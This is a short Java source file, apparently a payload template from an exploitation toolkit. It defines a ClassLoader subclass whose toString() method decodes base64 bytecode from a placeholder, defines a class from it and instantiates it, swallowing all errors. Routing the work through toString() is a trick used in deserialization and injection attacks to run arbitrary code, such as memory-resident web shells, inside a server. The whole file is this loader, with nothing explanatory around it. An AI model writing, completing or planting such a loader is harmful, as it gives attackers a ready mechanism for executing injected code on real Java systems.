class ClassDefiner extends ClassLoader {
    public ClassDefiner() {
        super(Thread.currentThread().getContextClassLoader());
    }

    public byte[] decodeBase64(String bytecodeBase64) {
        java.util.Base64.Decoder decoder = java.util.Base64.getDecoder();
        return decoder.decode(bytecodeBase64);
    }

    public Class<?> defineClass(byte[] code) {
        return defineClass(null, code, 0, code.length);
    }

    @Override
    public String toString() {
        String className = "{{className}}";
        String base64Str = "{{base64Str}}";
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            classLoader.loadClass(className).newInstance();
        } catch (Exception e) {
            try {
                byte[] bytecode = decodeBase64(base64Str);
                Class<?> clazz = defineClass(bytecode);
                clazz.newInstance();
            } catch (Exception ignored) {
            }
        }
        return className;
    }

    static void main(String[] args) {
        new ClassDefiner().toString();
    }
}